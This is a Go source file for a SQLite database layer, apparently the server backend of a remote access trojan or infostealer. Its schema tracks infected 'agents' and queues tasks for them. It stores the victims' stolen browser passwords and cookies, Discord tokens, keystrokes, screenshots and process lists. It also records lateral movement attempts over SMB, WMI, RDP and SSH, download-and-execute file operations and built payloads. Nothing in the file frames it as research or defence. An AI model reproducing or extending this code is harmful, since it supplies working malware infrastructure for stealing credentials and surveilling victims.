package db

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/jmoiron/sqlx"
	_ "modernc.org/sqlite"
)

func Init(dbPath string) (*sqlx.DB, error) {
	// Ensure directory exists
	dir := filepath.Dir(dbPath)
	if dir != "." && dir != "" {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return nil, fmt.Errorf("create db dir: %w", err)
		}
	}

	db, err := sqlx.Connect("sqlite", dbPath+"?_pragma=foreign_keys(1)&_pragma=journal_mode(WAL)&_pragma=busy_timeout(5000)")
	if err != nil {
		return nil, fmt.Errorf("open db: %w", err)
	}

	db.SetMaxOpenConns(1)
	db.SetMaxIdleConns(1)

	// Run migrations
	if err := migrate(db); err != nil {
		return nil, fmt.Errorf("migrate: %w", err)
	}

	return db, nil
}

func migrate(db *sqlx.DB) error {
	schema := `
	CREATE TABLE IF NOT EXISTS agents (
		id TEXT PRIMARY KEY,
		session_id INTEGER UNIQUE NOT NULL,
		hostname TEXT NOT NULL,
		username TEXT NOT NULL,
		os_version TEXT,
		arch TEXT,
		pid INTEGER,
		privileges INTEGER,
		hw_id TEXT,
		build_version INTEGER,
		first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
		last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
		ip_address TEXT,
		country TEXT,
		tags TEXT, -- JSON array
		notes TEXT,
		status TEXT DEFAULT 'active', -- active, stale, dead
		metadata TEXT -- JSON
	);

	CREATE INDEX IF NOT EXISTS idx_agents_session ON agents(session_id);
	CREATE INDEX IF NOT EXISTS idx_agents_hw_id ON agents(hw_id);
	CREATE INDEX IF NOT EXISTS idx_agents_status ON agents(status);
	CREATE INDEX IF NOT EXISTS idx_agents_last_seen ON agents(last_seen);

	CREATE TABLE IF NOT EXISTS tasks (
		id TEXT PRIMARY KEY,
		agent_id TEXT NOT NULL,
		command TEXT NOT NULL, -- JSON serialized CommandPayload
		args TEXT,
		status TEXT DEFAULT 'pending', -- pending, sent, running, completed, failed, cancelled
		result TEXT, -- JSON serialized result
		result_code INTEGER,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		sent_at DATETIME,
		completed_at DATETIME,
		priority INTEGER DEFAULT 0,
		retries INTEGER DEFAULT 0,
		max_retries INTEGER DEFAULT 3,
		FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_tasks_agent ON tasks(agent_id);
	CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status);
	CREATE INDEX IF NOT EXISTS idx_tasks_created ON tasks(created_at);

	CREATE TABLE IF NOT EXISTS files (
		id TEXT PRIMARY KEY,
		agent_id TEXT NOT NULL,
		filename TEXT NOT NULL,
		path TEXT NOT NULL,
		size INTEGER NOT NULL,
		checksum TEXT, -- SHA256
		mime_type TEXT,
		operation TEXT NOT NULL, -- upload, download, download_exec
		status TEXT DEFAULT 'pending', -- pending, transferring, completed, failed
		progress REAL DEFAULT 0,
		chunks_total INTEGER DEFAULT 0,
		chunks_received INTEGER DEFAULT 0,
		temp_path TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		completed_at DATETIME,
		error TEXT,
		FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_files_agent ON files(agent_id);
	CREATE INDEX IF NOT EXISTS idx_files_status ON files(status);
	CREATE INDEX IF NOT EXISTS idx_files_operation ON files(operation);

	CREATE TABLE IF NOT EXISTS file_chunks (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		file_id TEXT NOT NULL,
		chunk_index INTEGER NOT NULL,
		data BLOB NOT NULL,
		received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY (file_id) REFERENCES files(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_file_chunks_file ON file_chunks(file_id, chunk_index);

	CREATE TABLE IF NOT EXISTS credentials (
		id TEXT PRIMARY KEY,
		agent_id TEXT NOT NULL,
		browser INTEGER NOT NULL,
		url TEXT,
		username TEXT,
		password TEXT,
		created TEXT,
		extracted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_credentials_agent ON credentials(agent_id);

	CREATE TABLE IF NOT EXISTS cookies (
		id TEXT PRIMARY KEY,
		agent_id TEXT NOT NULL,
		browser INTEGER NOT NULL,
		host TEXT,
		name TEXT,
		value TEXT,
		path TEXT,
		expires_utc INTEGER,
		is_secure INTEGER,
		is_httponly INTEGER,
		is_persistent INTEGER,
		enc_version INTEGER,
		extracted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_cookies_agent ON cookies(agent_id);
	CREATE INDEX IF NOT EXISTS idx_cookies_host ON cookies(host);

	CREATE TABLE IF NOT EXISTS discord_tokens (
		id TEXT PRIMARY KEY,
		agent_id TEXT NOT NULL,
		token TEXT NOT NULL,
		email TEXT,
		user_id TEXT,
		username TEXT,
		discriminator TEXT,
		avatar TEXT,
		mfa_enabled INTEGER,
		source TEXT,
		extracted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_discord_agent ON discord_tokens(agent_id);

	CREATE TABLE IF NOT EXISTS keystrokes (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		agent_id TEXT NOT NULL,
		window_title TEXT,
		keys TEXT,
		timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_keystrokes_agent ON keystrokes(agent_id);
	CREATE INDEX IF NOT EXISTS idx_keystrokes_time ON keystrokes(timestamp);

	CREATE TABLE IF NOT EXISTS screenshots (
		id TEXT PRIMARY KEY,
		agent_id TEXT NOT NULL,
		filename TEXT,
		file_path TEXT,
		width INTEGER,
		height INTEGER,
		size INTEGER,
		checksum TEXT,
		captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_screenshots_agent ON screenshots(agent_id);
	CREATE INDEX IF NOT EXISTS idx_screenshots_time ON screenshots(captured_at);

	CREATE TABLE IF NOT EXISTS process_list (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		agent_id TEXT NOT NULL,
		pid INTEGER NOT NULL,
		ppid INTEGER,
		name TEXT,
		path TEXT,
		cmdline TEXT,
		mem_usage INTEGER,
		username TEXT,
		session_id INTEGER,
		is_wow64 INTEGER,
		captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_process_agent ON process_list(agent_id);

	CREATE TABLE IF NOT EXISTS audit_log (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		agent_id TEXT,
		user_id TEXT, -- operator who performed action
		action TEXT NOT NULL,
		details TEXT, -- JSON
		ip_address TEXT,
		timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE INDEX IF NOT EXISTS idx_audit_agent ON audit_log(agent_id);
	CREATE INDEX IF NOT EXISTS idx_audit_time ON audit_log(timestamp);

	CREATE TABLE IF NOT EXISTS lateral_moves (
		id TEXT PRIMARY KEY,
		source_agent_id TEXT NOT NULL,
		target_host TEXT NOT NULL,
		target_ip TEXT,
		method TEXT NOT NULL, -- smb, wmi, rdp, ssh, etc.
		status TEXT DEFAULT 'pending', -- pending, running, success, failed
		result TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		completed_at DATETIME,
		FOREIGN KEY (source_agent_id) REFERENCES agents(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_lateral_source ON lateral_moves(source_agent_id);
	CREATE INDEX IF NOT EXISTS idx_lateral_status ON lateral_moves(status);

	CREATE TABLE IF NOT EXISTS server_config (
		key TEXT PRIMARY KEY,
		value TEXT NOT NULL,
		updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS payloads (
		id TEXT PRIMARY KEY,
		filename TEXT NOT NULL,
		size INTEGER NOT NULL DEFAULT 0,
		status TEXT DEFAULT 'completed',
		temp_path TEXT,
		config TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	`

	_, err := db.Exec(schema)
	return err
}